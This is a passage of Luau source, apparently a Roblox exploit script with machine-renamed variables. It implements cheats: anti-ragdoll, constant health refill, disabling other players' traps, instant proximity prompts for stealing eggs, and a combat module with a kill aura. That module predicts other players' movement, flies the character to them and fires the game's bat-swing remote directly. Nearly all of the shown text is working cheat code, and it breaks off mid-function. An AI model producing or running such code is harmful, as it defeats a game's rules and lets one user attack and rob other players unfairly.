			fn42(arg.DescendantAdded:Connect(function(descendant)
				if flag4 and tbl19[descendant.ClassName] then
					fn55()
				end
			end))

			fn42(arg.ChildAdded:Connect(function(child)
				if flag4 and child:IsA("Humanoid") and child ~= humanoid then
					task.defer(fn56)
				end
			end))

			fn48()

			if fn50() then
				fn55()
			end
		end

		local function fn58()
			flag4 = false
			n19 += 1
			n18 = 0

			if connection then
				pcall(function()
					connection:Disconnect()
				end)

				connection = nil
			end

			fn40(tbl22)
			fn40(tbl21)
			v15 = nil
			humanoid = nil
		end

		local function fn59()
			fn58()
			flag4 = true
			fn38()
			connection = RunService.Heartbeat:Connect(fn57)

			fn41(localPlayer.CharacterAdded:Connect(function(character)
				if flag4 then
					task.defer(function()
						if flag4 and character == localPlayer.Character then
							fn39(character)
						end
					end)
				end
			end))

			fn41(localPlayer.CharacterRemoving:Connect(function(character)
				if flag4 and character == v15 then
					n19 += 1
					n18 = 0
					fn40(tbl22)
					v15 = nil
					humanoid = nil
				end
			end))

			fn41(localPlayer:GetAttributeChangedSignal("RagdollEndTime"):Connect(function()
				if flag4 then
					fn55()
				end
			end))

			local clientRagdollRemote = type(v13) == "table" and v13.ClientRagdollRemote or nil

			if typeof(clientRagdollRemote) == "Instance" and clientRagdollRemote:IsA("RemoteEvent") then
				fn41(clientRagdollRemote.OnClientEvent:Connect(function()
					if flag4 and not fn51() then
						fn43()
						fn55()
					end
				end))
			end

			fn41(tbl4.OnHumanoidChanged(function()
				if flag4 and localPlayer.Character then
					fn39(localPlayer.Character)
				end
			end))

			if localPlayer.Character then
				fn39(localPlayer.Character)
			end
		end

		fn4(fn58)

		local tbl23 = {
			Name = "Anti Ragdoll",
			Default = true,
			Callback = function()
				if tbl4.Toggle(createToggle, false) then
					fn59()
				else
					fn58()
				end
			end,
		}

		createToggle = v11.CreateToggle
		createToggle = createToggle(v11, tbl23)
	end

	do
		local flag4 = false
		local tbl19 = {}

		local function fn38()
			for _, v13 in ipairs(tbl19) do
				pcall(function()
					v13:Disconnect()
				end)
			end

			table.clear(tbl19)
		end

		local function fn39(arg)
			if flag4 and arg.Parent and arg.Health > 0 and arg.Health < arg.MaxHealth then
				pcall(function()
					arg.Health = arg.MaxHealth
				end)
			end
		end

		local function fn40(arg)
			fn38()
			if not flag4 or not arg then
				return
			end
			local humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)
			if not flag4 or not humanoid or not humanoid:IsA("Humanoid") or arg ~= localPlayer.Character then
				return
			end

			table.insert(tbl19, humanoid.HealthChanged:Connect(function()
				fn39(humanoid)
			end))

			table.insert(tbl19, RunService.Heartbeat:Connect(function()
				fn39(humanoid)
			end))

			fn39(humanoid)
		end

		local connection = localPlayer.CharacterAdded:Connect(function(character)
			if flag4 then
				task.defer(fn40, character)
			end
		end)

		local v13 = tbl4.OnHumanoidChanged(function()
			if flag4 and localPlayer.Character then
				fn40(localPlayer.Character)
			end
		end)

		fn4(function()
			flag4 = false
			connection:Disconnect()
			v13:Disconnect()
			fn38()
		end)

		flag4 = true

		if localPlayer.Character then
			task.spawn(fn40, localPlayer.Character)
		end
	end

	do
		local v13 = nil
		local flag4 = true
		local tbl19 = {}
		local tbl20 = {}

		local function fn38(arg)
			if arg:IsA("BasePart") and tbl19[arg] == nil then
				tbl19[arg] = arg.CanTouch

				pcall(function()
					arg.CanTouch = false
				end)
			end
		end

		local function fn39(arg)
			if not flag4 or not arg.Parent then
				return
			end
			local name = localPlayer.Name
			if arg:GetAttribute("Owner") == name then
				return
			end
			fn38(arg)

			for _, descendant in ipairs(arg:GetDescendants()) do
				fn38(descendant)
			end

			table.insert(tbl20, arg.DescendantAdded:Connect(function(descendant)
				if flag4 then
					fn38(descendant)
				end
			end))
		end

		local function fn40()
			for _, v14 in ipairs(CollectionService:GetTagged("PlacedTrap")) do
				fn39(v14)
			end
		end

		local function fn41()
			for k, v14 in pairs(tbl19) do
				if k.Parent then
					pcall(function()
						k.CanTouch = v14
					end)
				end
			end

			table.clear(tbl19)
		end

		table.insert(tbl20, CollectionService:GetInstanceAddedSignal("PlacedTrap"):Connect(function(arg)
			task.defer(fn39, arg)
		end))

		v13 = v11:CreateToggle({
			Name = "Anti Trap",
			Note = "Traps from other players cannot catch you",
			Default = true,
			Callback = function()
				flag4 = tbl4.Toggle(v13, true) == true

				if flag4 then
					fn40()
				else
					fn41()
				end
			end,
		})

		fn40()

		fn4(function()
			flag4 = false

			for _, v14 in ipairs(tbl20) do
				pcall(function()
					v14:Disconnect()
				end)
			end

			table.clear(tbl20)
			fn41()
		end)
	end

	do
		local v13 = nil
		local str3 = "CarryAreaEgg"
		local tbl19 = { ClaimLostPart = true }
		local tbl20 = {}
		local connection = nil
		local connection2 = nil

		local function fn38(arg)
			if not arg:IsA("ProximityPrompt") or tbl19[arg.Name] then
				return
			end

			if tbl20[arg] == nil then
				if arg.HoldDuration <= 0 and arg.Name ~= str3 then
					return
				end
				tbl20[arg] = arg.HoldDuration
			end

			if arg.HoldDuration ~= 0 then
				pcall(function()
					arg.HoldDuration = 0
				end)
			end
		end

		local function fn39(arg)
			if arg.Name ~= "SmartPromptPart" then
				return nil
			end
			local carryAreaEgg = arg:FindFirstChild("CarryAreaEgg")
			return carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") and carryAreaEgg or nil
		end

		tbl4.PromptHold = function(arg)
			local v14 = tbl20[arg]
			if type(v14) == "number" then
				return v14
			end
			return arg.HoldDuration
		end

		local function fn40()
			if connection then
				return
			end

			connection2 = ProximityPromptService.PromptShown:Connect(function(arg)
				if tbl4.Toggle(v13, true) then
					fn38(arg)
				end
			end)

			for _, child in ipairs(workspace:GetChildren()) do
				local v14 = fn39(child)

				if v14 then
					fn38(v14)
				end
			end

			connection = workspace.ChildAdded:Connect(function(child)
				if child.Name ~= "SmartPromptPart" then
					return
				end

				task.defer(function()
					local carryAreaEgg = child:FindFirstChild("CarryAreaEgg") or child:WaitForChild("CarryAreaEgg", 2)

					if carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") and tbl4.Toggle(v13, true) then
						fn38(carryAreaEgg)
					end
				end)
			end)
		end

		local function fn41()
			for k, v14 in pairs(tbl20) do
				if k and k.Parent then
					pcall(function()
						k.HoldDuration = v14
					end)
				end
			end

			table.clear(tbl20)

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end
		end

		tbl4.PressStealPrompt = function(arg)
			if typeof(fireproximityprompt) ~= "function" or not arg then
				return false
			end
			local v14 = nil
			local huge = math.huge

			for _, child in ipairs(workspace:GetChildren()) do
				local v15 = fn39(child)

				if v15 and child:IsA("BasePart") then
					local magnitude = (child.Position - arg).Magnitude

					if magnitude < huge then
						v14 = v15
						huge = magnitude
					end
				end
			end

			if not v14 or huge > 14 then
				return false
			end

			if tbl4.Toggle(v13, true) then
				pcall(function()
					v14.HoldDuration = 0
				end)
			end

			local ok = pcall(fireproximityprompt, v14)

			if ok and v14.HoldDuration > 0 then
				task.wait(v14.HoldDuration + 0.1)
			end

			return ok
		end

		tbl3.Add(function()
			if tbl4.Toggle(v13, true) then
				fn40()

				for k in pairs(tbl20) do
					if not k.Parent then
						tbl20[k] = nil
					elseif k.HoldDuration ~= 0 then
						pcall(function()
							k.HoldDuration = 0
						end)
					end
				end
			elseif next(tbl20) ~= nil or connection then
				fn41()
			end

			return false
		end)

		v13 = v11:CreateToggle({
			Name = "Instant Prompts",
			Default = true,
			Callback = function()
				tbl3.Wake()
			end,
		})

		fn4(fn41)
	end

	tbl4.Combat = {}

	do
		local combat = tbl4.Combat
		local n15 = 15
		local n16 = 2
		local n17 = 0.05
		local n18 = 1
		local n19 = 0.18
		local n20 = -0.275
		local n21 = 0.6
		local n22 = 6
		local n23 = 1.1
		local n24 = 0.8
		local n25 = 2.5
		local n26 = 35
		local n27 = 0.12
		local n28 = 6
		local n29 = 6
		local n30 = 3
		local tbl19 = { 0.12, 0.2, 0.28, 0.36, 0.46, 0.6 }
		local tbl20 = { ["WALL LEFT"] = true, ["WALL RIGHT"] = true }

		local tbl21 = {
			Trigger = nil,
			LastFire = 0,
			Trace = 0,
			EquipAt = 0,
			Walls = {},
			WallsAt = 0,
			WallSide = setmetatable({}, { __mode = "k" }),
			Tracks = setmetatable({}, { __mode = "k" }),
			Stats = {},
			Option = 3,
			Pending = {},
			Holders = {},
			SpawnRagdoll = nil,
		}

		for i = 1, #tbl19 do
			tbl21.Stats[i] = { Hits = 0, Shots = 0 }
		end

		local raycastParams = RaycastParams.new()
		raycastParams.FilterType = Enum.RaycastFilterType.Exclude

		pcall(function()
			raycastParams.RespectCanCollide = true
		end)

		local function fn38()
			return workspace:GetServerTimeNow()
		end

		local function fn39()
			local trigger = tbl21.Trigger
			if trigger and trigger.Parent then
				return trigger
			end
			local reBatSwingTrigger = networking:FindFirstChild("RE/BatSwing/Trigger")
			tbl21.Trigger = reBatSwingTrigger
			return reBatSwingTrigger
		end

		local function fn40(arg)
			return tonumber(arg:GetAttribute("RagdollEndTime")) or 0
		end

		combat.SetLead = function(arg)
			n20 = math.clamp((tonumber(arg) or -275) / 1000, -0.4, 0.1)
		end

		combat.SetSweep = function(arg)
			n21 = math.clamp((tonumber(arg) or 60) / 100, 0, 2.5)
		end

		combat.Ragdolled = function(arg)
			return fn40(arg) > fn38()
		end

		combat.SelfRagdolled = function()
			local v13 = fn40(localPlayer)
			if v13 <= fn38() then
				return false
			end
			return v13 ~= tbl21.SpawnRagdoll
		end

		combat.Humanoid = function(arg)
			if not arg then
				return nil
			end
			local v13 = nil

			for _, child in ipairs(arg:GetChildren()) do
				if child:IsA("Humanoid") then
					if child.Health > 0 then
						return child
					end
					v13 = v13 or child
				end
			end

			return v13
		end

		local function fn41(arg)
			local gears = tbl.Gears
			local directory = type(gears) == "table" and gears.Directory or nil
			local flag4 = type(directory) == "table"

			if flag4 then
				flag4 = directory[tostring(arg:GetAttribute("GearName") or arg.Name)]
			end

			local v13 = flag4 or nil
			local batControllerData = type(v13) == "table" and v13.BatControllerData or nil
			return type(batControllerData) == "table" and tonumber(batControllerData.RangeBonus) or 0
		end

		combat.Range = function(arg)
			local n31 = workspace:GetAttribute("DragonEggEventActive") == true and 2.5 or 1
			return (n15 + n16 + (arg and fn41(arg) or 0)) * n31
		end

		combat.PickBat = function(arg)
			local tool = arg:FindFirstChildWhichIsA("Tool")
			if tool and tbl4.IsBatTool(tool) then
				return tool
			end
			local v13, v14, v15 = ipairs({ arg, localPlayer:FindFirstChildOfClass("Backpack") })
			local n31 = -1
			local v16 = nil

			for _, v17 in v13, v14, v15 do
				if v17 then
					for _, child in ipairs(v17:GetChildren()) do
						if tbl4.IsBatTool(child) then
							local v18 = fn41(child)

							if n31 < v18 then
								n31 = v18
								v16 = child
							end
						end
					end
				end
			end

			return v16
		end

		local function fn42(parent, arg, arg2)
			if arg2.Parent == parent then
				return true
			end
			local equipAt = tbl21.EquipAt
			if os.clock() - equipAt < 0.2 then
				return false
			end
			tbl21.EquipAt = os.clock()

			pcall(function()
				arg:EquipTool(arg2)
			end)

			if arg2.Parent ~= parent then
				pcall(function()
					arg2.Parent = parent
				end)
			end

			return arg2.Parent == parent
		end

		combat.Parts = function(arg)
			arg = arg and arg.Character
			local humanoidRootPart = arg and arg:FindFirstChild("HumanoidRootPart")
			local humanoid = arg and arg:FindFirstChildOfClass("Humanoid")
			if not humanoidRootPart or not humanoid or humanoid.Health <= 0 then
				return nil, nil
			end
			return arg, humanoidRootPart
		end

		combat.Hittable = function(arg)
			if not arg or arg == localPlayer or arg.Parent ~= Players then
				return false
			end
			local v13, v14 = combat.Parts(arg)
			if not v13 then
				return false
			end

			if v13:GetAttribute("IsTrapped") == true or arg:GetAttribute("InBossArena") then
				return false
			end
			return not tbl4.InsideBase(v14.Position)
		end

		local function fn43()
			local wallsAt = tbl21.WallsAt
			if os.clock() < wallsAt then
				return tbl21.Walls
			end
			tbl21.WallsAt = os.clock() + 5
			local walls = {}
			local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
			world = world and world:FindFirstChild("Build")

			if world then
				for _, child in ipairs(world:GetChildren()) do
					local collisions = child:FindFirstChild("COLLISIONS")
					collisions = collisions and collisions:FindFirstChild("GUARD NO COLLIDE")

					if collisions then
						for _, child2 in ipairs(collisions:GetChildren()) do
							if tbl20[child2.Name] then
								if child2:IsA("BasePart") then
									table.insert(walls, child2)
								end

								for _, descendant in ipairs(child2:GetDescendants()) do
									if descendant:IsA("BasePart") then
										table.insert(walls, descendant)
									end
								end
							end
						end
					end
				end
			end

			tbl21.Walls = walls
			return walls
		end

		local function fn44(arg)
			if arg.X <= arg.Y and arg.X <= arg.Z then
				return "X", "Y", "Z"
			end

			if arg.Y <= arg.Z then
				return "Y", "X", "Z"
			end
			return "Z", "X", "Y"
		end

		local function fn45(arg)
			local n31 = math.abs(arg.RightVector.Y)
			local n32 = math.abs(arg.UpVector.Y)
			local n33 = math.abs(arg.LookVector.Y)
			if n31 >= n32 and n31 >= n33 then
				return "X"
			end

			if n32 >= n33 then
				return "Y"
			end
			return "Z"
		end

		local function fn46(arg, arg2, arg3, arg4)
			if arg3 == arg4 then
				return true
			end
			local n31 = arg2[arg3] + n28
			return math.abs(arg[arg3]) <= n31
		end

		local function fn47(arg, arg2)
			for _, v13 in ipairs(fn43()) do
				if v13.Parent then
					local cFrame = v13.CFrame
					local size = v13.Size
					local v14, v15, v16 = fn44(size)
					local v17 = fn45(cFrame)
					local n31 = size / 2
					local v18 = cFrame:PointToObjectSpace(arg2)

					if fn46(v18, n31, v15, v17) and fn46(v18, n31, v16, v17) then
						local v19 = cFrame:PointToObjectSpace(arg)
						local n32 = math.abs(v19[v14])
						local n33 = tbl21.WallSide[v13]

						if n32 >= n31[v14] + n28 * 0.5 or n33 == nil and n32 >= n31[v14] then
							n33 = v19[v14] >= 0 and 1 or -1
							tbl21.WallSide[v13] = n33
						elseif n33 == nil then
							n33 = v19[v14] >= 0 and 1 or -1
						end

						local n34 = n31[v14] + n28

						if v18[v14] * n33 < n34 then
							local tbl22 = { X = v18.X, Y = v18.Y, Z = v18.Z, [v14] = n33 * n34 }
							arg2 = cFrame:PointToWorldSpace(Vector3.new(tbl22.X, tbl22.Y, tbl22.Z))
						end
					end
				end
			end

			return arg2
		end

		combat.KeepOffWalls = function(arg, arg2)
			local v13 = fn47(arg, arg2)
			local n31 = v13 - arg

			if n31.Magnitude > n28 then
				local v14 = arg

				for i = 1, 6 do
					local n32 = arg + n31 * i / n29
					local v15 = fn47(v14, n32)
					if (v15 - n32).Magnitude > 0.01 then
						return fn47(arg, v15)
					end
					v14 = v15
				end
			end

			return v13
		end

		combat.ResetWalls = function()
			table.clear(tbl21.WallSide)
		end

		local n31 = 0
		local v13 = nil

		local function fn48(arg)
			local character = localPlayer.Character

			if os.clock() - n31 > 0.5 or character ~= v13 then
				n31 = os.clock()
				v13 = character
				local filterDescendantsInstances = {}

				for _, player in ipairs(Players:GetPlayers()) do
					if player.Character then
						table.insert(filterDescendantsInstances, player.Character)
					end
				end

				raycastParams.FilterDescendantsInstances = filterDescendantsInstances
			end

			local hit = workspace:Raycast(arg + Vector3.new(0, 60, 0), Vector3.new(0, -400, 0), raycastParams)
			if hit and arg.Y < hit.Position.Y + n30 then
				return Vector3.new(arg.X, hit.Position.Y + n30, arg.Z)
			end
			return arg
		end

		local function fn49(arg, arg2)
			local tbl22 = tbl21.Tracks[arg]

			if not tbl22 then
				tbl22 = { Samples = {}, Smooth = nil, Heading = nil }
				tbl21.Tracks[arg] = tbl22
			end

			local now = os.clock()
			local samples = tbl22.Samples
			table.insert(samples, { Time = now, Position = arg2.Position })

			while #samples > 2 and now - samples[1].Time > n27 do
				table.remove(samples, 1)
			end

			local assemblyLinearVelocity = arg2.AssemblyLinearVelocity
			local v14 = samples[1]
			local n32 = now - v14.Time
			local v15

			if n32 >= 0.03 then
				local n33 = (arg2.Position - v14.Position) / n32

				if n33.Magnitude <= 1500 and assemblyLinearVelocity.Magnitude <= n33.Magnitude * 1.4 then
					v15 = n33
				else
					v15 = assemblyLinearVelocity
				end
			else
				v15 = assemblyLinearVelocity
			end

			local vector = Vector3.new(v15.X, 0, v15.Z)
			tbl22.Smooth = tbl22.Smooth and tbl22.Smooth:Lerp(vector, 0.25) or vector
			local smooth = tbl22.Smooth

			if smooth.Magnitude > 1 then
				local heading = tbl22.Heading and tbl22.Heading:Lerp(smooth.Unit, 0.25) or smooth.Unit
				tbl22.Heading = heading.Magnitude > 0.01 and heading.Unit or smooth.Unit
			end

			return v15, vector, smooth, tbl22
		end

		local function fn50()
			local n32 = 0

			for _, stat in ipairs(tbl21.Stats) do
				n32 += stat.Shots
			end

			local option = tbl21.Option
			local n33 = -math.huge

			for i, stat in ipairs(tbl21.Stats) do
				local n34 = stat.Shots + 1
				local n35 = (stat.Hits + 1) / (stat.Shots + 2) + math.sqrt(2 * math.log(n32 + 2) / n34) * 0.35

				if n35 > n33 then
					n33 = n35
					option = i
				end
			end

			tbl21.Option = option
			return option
		end

		local function fn51()
			local now = os.clock()

			for i = #tbl21.Pending, 1, -1 do
				local v14 = tbl21.Pending[i]
				local v15 = tbl21.Stats[v14.Option]
				local n32 = v14.RagdollBefore + 0.01

				if fn40(v14.Target) > n32 then
					v15.Hits = v15.Hits + 1
					v15.Shots = v15.Shots + 1
					table.remove(tbl21.Pending, i)
				elseif v14.Wait < now - v14.At then
					if (v14.Tool and tonumber(v14.Tool:GetAttribute("CooldownEndTime")) or 0) > v14.CooldownBefore + 0.01 then
						v15.Shots = v15.Shots + 1
					end

					table.remove(tbl21.Pending, i)
				end
			end
		end

		combat.Plan = function(arg, arg2, arg3, arg4)
			if not arg3 then
				local v14
				v14, arg3 = combat.Parts(arg)
			end

			if not arg3 or not arg3.Parent then
				return nil
			end
			local n32 = math.clamp(localPlayer:GetNetworkPing(), 0, 1)
			local n33 = math.clamp(n32 + n17, 0.05, 0.35)
			local v14, v15, v16, v17 = fn49(arg or arg3, arg3)
			local v18 = fn50()
			local v19 = tbl19[v18]
			local position = arg3.Position
			local n34 = position + v14 * math.max(0, v19 + n32 - n33)
			local n35 = position + v14 * (v19 + n32)
			local magnitude = v16.Magnitude
			local heading = v17.Heading

			if not heading then
				local vector = Vector3.new(arg2.Position.X - position.X, 0, arg2.Position.Z - position.Z)
				heading = vector.Magnitude > 0.1 and vector.Unit or Vector3.new(0, 0, 1)
			end

			local character = localPlayer.Character
			local v20 = combat.Range(character and combat.PickBat(character) or nil)
			local n36 = position + v16 * (n32 + v19 + n19 + n20) + (magnitude > 1 and v16.Unit * n22 * n21 or Vector3.zero)
			local n37 = math.max(5, math.min(v20 * 0.7, 6 + magnitude * 0.07)) * n21
			local now = os.clock()
			local n38 = (math.sin(now * 2 * 3.1415926535897931 / n23) * 0.5 + 0.5) * n37
			local n39 = math.sin(now * 2 * 3.1415926535897931 / n24) * n25
			local vector = Vector3.new(-heading.Z, 0, heading.X)

			if vector:Dot(arg2.Position - n36) < 0 then
				vector = -vector
			end

			local n40 = n36 + heading * n38 + vector * (v15.Magnitude < n26 and 3 or 1.5) + Vector3.new(0, n39, 0)
			local position2 = arg2.Position

			if not arg4 then
				position2 = combat.KeepOffWalls(arg2.Position, fn48(Vector3.new(n40.X, n40.Y, position.Z)))
			end

			return {
				Goal = position2,
				Velocity = Vector3.new(v16.X, 0, v16.Z),
				Face = n35,
				Current = n35,
				Historical = n34,
				Option = v18,
				Distance = (position - arg2.Position).Magnitude,
			}
		end

		combat.Steer = function(arg, arg2, arg3, arg4, arg5)
			local n32 = math.max(arg5, 0.0041666666666666666)
			local velocity = arg2.Velocity
			local n33 = velocity + (arg2.Goal - arg.Position) / math.max(0.12, n32)
			local n34 = math.min(arg3 + velocity.Magnitude, arg4)

			if n34 < n33.Magnitude then
				n33 = n33.Unit * n34
			end

			local position = arg.Position
			local n35 = position + n33 * n32
			local v14 = combat.KeepOffWalls(position, n35)

			if (v14 - n35).Magnitude > 0.01 then
				n33 = (v14 - position) / n32
			end

			local v15 = combat.KeepOffWalls(position, position)

			if (v15 - position).Magnitude > 0.01 then
				n33 = (v15 - position) / math.max(0.12, n32)
			end

			local assemblyLinearVelocity = n33 + Vector3.new(0, workspace.Gravity * n32 * 0.5, 0)

			pcall(function()
				local vector = Vector3.new(arg2.Face.X - position.X, 0, arg2.Face.Z - position.Z)

				if vector.Magnitude > 0.05 then
					arg.CFrame = CFrame.lookAt(position, position + vector.Unit)
				end

				arg.AssemblyLinearVelocity = assemblyLinearVelocity
				arg.AssemblyAngularVelocity = Vector3.zero
			end)
		end

		combat.TryHit = function(arg, arg2)
			fn51()
			if workspace:GetAttribute("PvPDisabled") == true then
				return "Player hits are off right now"
			end
			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			local v14 = combat.Humanoid(character)
			if not humanoidRootPart or not v14 or v14.Health <= 0 then
				return "Waiting for your character"
			end
			local v15 = combat.PickBat(character)
			if not v15 then
				return "No bat found"
			end

			if not fn42(character, v14, v15) then
				return "Equipping " .. tostring(v15:GetAttribute("GearName") or v15.Name)
			end

			if not combat.Hittable(arg) or combat.Ragdolled(arg) then
				return nil
			end
			local v16 = arg2 or combat.Plan(arg, humanoidRootPart)
			if not v16 then
				return nil
			end
			local n32 = combat.Range(v15) - n18
			local n33 = humanoidRootPart.Position - humanoidRootPart.AssemblyLinearVelocity * n19
			if (v16.Historical - n33).Magnitude > n32 and (v16.Current - n33).Magnitude > n32 then
				return nil
			end
			local v17 = fn39()
			if not v17 then
				return nil
			end
			local n34 = math.clamp(localPlayer:GetNetworkPing(), 0, 1)
			local n35 = tonumber(v15:GetAttribute("CooldownEndTime")) or 0
			if fn38() < n35 - n34 * 0.5 then
				return nil
			end
			local lastFire = tbl21.LastFire
			if os.clock() - lastFire < math.max(0.12, n34 * 1.5) then
				return nil
			end
			tbl21.LastFire = os.clock()
			tbl21.Trace = tbl21.Trace + 1

			table.insert(tbl21.Pending, {
				Target = arg,
				Option = v16.Option,
				At = os.clock(),
				Wait = math.max(0.5, n34 * 2 + 0.3),
				RagdollBefore = fn40(arg),
				CooldownBefore = n35,
				Tool = v15,
			})

			local str3 = string.format("%d:%d:%d", localPlayer.UserId, tbl21.Trace, math.floor(fn38() * 1000))

			pcall(function()
				v17:FireServer(arg, str3)
			end)

			return "Hitting " .. arg.DisplayName
		end

		combat.ReadyBat = function()
			local character = localPlayer.Character
			local v14 = combat.Humanoid(character)
			if not character or not v14 or v14.Health <= 0 then
				return false
			end
			local v15 = combat.PickBat(character)
			return v15 ~= nil and fn42(character, v14, v15)
		end

		combat.Swing = function()
			if tbl4.Steal.Active or tbl4.Steal.Carrying then
				return false
			end
			local lastFire = tbl21.LastFire
			local flag4 = os.clock() - lastFire < 0.3

			if not flag4 then
				flag4 = os.clock() - (tbl21.LastSwing or 0) < 0.15
			end

			if flag4 then
				return false
			end
			local character = localPlayer.Character
			local v14 = combat.Humanoid(character)
			if not character or not v14 or v14.Health <= 0 then
				return false
			end
			local v15 = combat.PickBat(character)
			if not v15 or not fn42(character, v14, v15) then
				return false
			end
			tbl21.LastSwing = os.clock()

			pcall(function()
				v15:Activate()
			end)

			return true
		end

		combat.HolderOf = function(arg)
			local v14 = workspace:FindFirstChild(arg)
			if not v14 then
				return nil
			end

			for _, descendant in ipairs(v14:GetDescendants()) do
				if descendant:IsA("JointInstance") or descendant:IsA("WeldConstraint") or descendant:IsA("RigidConstraint") then
					local ok, result, result2 = pcall(function()
						return descendant.Part0, descendant.Part1
					end)

					if ok then
						for _, v15 in ipairs({ result, result2 }) do
							if typeof(v15) == "Instance" and not v15:IsDescendantOf(v14) then
								local model = v15:FindFirstAncestorOfClass("Model")
								local playerFromCharacter = model and (Players:GetPlayerFromCharacter(model) or Players:FindFirstChild(model.Name)) or nil
								if playerFromCharacter and playerFromCharacter ~= localPlayer and playerFromCharacter:IsA("Player") then
									return playerFromCharacter
								end
							end
						end
					end
				end
			end

			return nil
		end

		task.spawn(function()
			while not tbl4.CombatDisposed do
				local holders = {}

				if tbl4.CombatWantsHolders then
					local eggState = tbl.EggState

					if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
						local ok, result = pcall(eggState.ReadFieldEggs)
						local records = ok and type(result) == "table" and result.Records or nil

						if type(records) == "table" then
							for _, record in pairs(records) do
								if type(record) == "table" and record.State == "Carried" and type(record.Uid) == "string" then
									local v14 = combat.HolderOf(record.Uid)

									if v14 then
										holders[v14] = true
									end
								end
							end
						end
					end
				end

				tbl21.Holders = holders
				task.wait(0.3)
			end
		end)

		combat.IsHolder = function(arg)
			return tbl21.Holders[arg] == true
		end

		local tbl22 = {}

		combat.OnNewLife = function(arg)
			table.insert(tbl22, arg)
		end

		local function fn52()
			table.clear(tbl21.Pending)
			tbl21.LastFire = 0
			tbl21.LastSwing = 0
			tbl21.EquipAt = 0
			table.clear(tbl21.Tracks)
			table.clear(tbl21.WallSide)
			tbl21.SpawnRagdoll = fn40(localPlayer)

			for _, v14 in ipairs(tbl22) do
				pcall(v14)
			end
		end

		local characterAdded = localPlayer.CharacterAdded
		local connect = characterAdded.Connect
		local tbl23 = { localPlayer.CharacterRemoving:Connect(fn52), connect(characterAdded, fn52) }

		fn4(function()
			tbl4.CombatDisposed = true

			for _, v14 in ipairs(tbl23) do
				pcall(function()
					v14:Disconnect()
				end)
			end
		end)
	end

	do
		local combat = tbl4.Combat
		local tbl19 = { "Nearest", "Egg Holders", "Specific Player" }
		local n15 = 0.7
		local str3 = "No other players"

		local tbl20 = {
			Handles = {},
			AuraHandle = nil,
			Row = nil,
			Picker = nil,
			TargetMode = tbl19[1],
			Picked = nil,
			LabelToName = {},
			Speed = 400,
			MaxSpeed = 750,
			Target = nil,
			Plan = nil,
			Moving = false,
			Status = "Idle",
			Shown = nil,
			NamesDirty = true,
		}

		local function fn38()
			for i, v13 in ipairs(tbl19) do
				if tbl4.Toggle(tbl20.Handles[i], false) then
					return v13
				end
			end

			return nil
		end

		local function fn39()
			return tbl4.Toggle(tbl20.AuraHandle, false) == true
		end

		tbl4.CombatActive = function()
			return fn38() ~= nil or fn39()
		end

		local function fn40(arg)
			if not combat.Hittable(arg) then
				return false
			end

			if tbl20.TargetMode == tbl19[2] then
				return combat.IsHolder(arg)
			end

			if tbl20.TargetMode == tbl19[3] then
				return tbl20.Picked ~= nil and arg.Name == tbl20.Picked
			end
			return true
		end

		local function fn41(arg)
			local target = tbl20.Target
			local magnitude

			if target and fn40(target) then
				local v13, v14 = combat.Parts(target)
				magnitude = (v14.Position - arg).Magnitude
			else
				magnitude = math.huge
				target = nil
			end

			local huge = math.huge
			local v13 = nil

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= target and fn40(player) and not combat.Ragdolled(player) then
					local v14, v15 = combat.Parts(player)
					local magnitude2 = (v15.Position - arg).Magnitude

					if magnitude2 < huge then
						huge = magnitude2
						v13 = player
					end
				end
			end

			if target then
				if v13 and not combat.Ragdolled(target) and huge < magnitude * n15 then
					return v13
				end
				return target
			end

			return v13
		end

		local function fn42(arg, arg2)
			local v13 = nil

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					local character = player.Character
					character = character and character:FindFirstChild("HumanoidRootPart")

					if character then
						local magnitude = (character.Position - arg).Magnitude

						if magnitude < arg2 and combat.Hittable(player) and not combat.Ragdolled(player) then
							arg2 = magnitude
							v13 = player
						end
					end
				end
			end

			return v13, arg2
		end

		local function fn43()
			tbl20.Plan = nil

			if tbl20.Moving then
				tbl20.Moving = false
				tbl4.EndFlight()
				tbl4.GodMode(false)
				tbl4.Shield("combat", false)
				combat.ResetWalls()
			end

			tbl4.ReleaseMovement("combat")
		end

		combat.OnNewLife(function()
			tbl20.AuraVictim = nil
			tbl20.Target = nil
			tbl20.Plan = nil
			pcall(fn43)
		end)

		local function fn44()
			local movement = tbl4.Movement
			return tbl4.Steal.Active or tbl4.Steal.Carrying or tbl4.Steal.Wanted and tbl4.Toggle(v5, false) or movement.Owner ~= nil and movement.Owner ~= "combat" and movement.Owner ~= "treadmill"
		end

		local function fn45(arg)
			local character = localPlayer.Character
			local n16 = combat.Range(character and combat.PickBat(character) or nil) + 6
			local v13, v14 = fn42(arg.Position, n16 + 24)

			if not v13 or v14 > n16 then
				tbl20.AuraVictim = nil

				if v13 then
					combat.ReadyBat()
				end

				tbl20.Status = "Aura ready, nobody in reach"
				return
			end

			tbl20.AuraVictim = v13
			tbl20.Status = combat.TryHit(v13, combat.Plan(v13, arg, nil, true)) or "Aura on " .. v13.DisplayName
		end

		local function fn46()
			local v13 = fn38()

			if v13 and v13 ~= tbl20.TargetMode then
				tbl20.TargetMode = v13
				tbl20.Target = nil
			end

			tbl4.CombatWantsHolders = v13 == tbl19[2]
			local v14 = fn39()
			local flag4 = not v13

			if flag4 then
				if tbl20.Target or tbl20.Moving then
					tbl20.Target = nil
					fn43()
				end
			end

			if flag4 and not v14 then
				tbl20.Status = "Idle"
				return
			end
			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			local v15 = combat.Humanoid(character)

			if not humanoidRootPart or not v15 or v15.Health <= 0 then
				tbl20.Target = nil
				fn43()
				tbl20.Status = "Waiting for your character"
				return
			end

			if flag4 then
				fn45(humanoidRootPart)
				return
			end
			local v16 = fn41(humanoidRootPart.Position)
			tbl20.Target = v16

			if not v16 then
				fn43()
				if v14 then
					fn45(humanoidRootPart)
					return
				end
				tbl20.Status = v13 == tbl19[2] and "Waiting for someone to hold an egg" or v13 == tbl19[3] and "Picked player is not reachable" or "No player to hit"
				return
			end

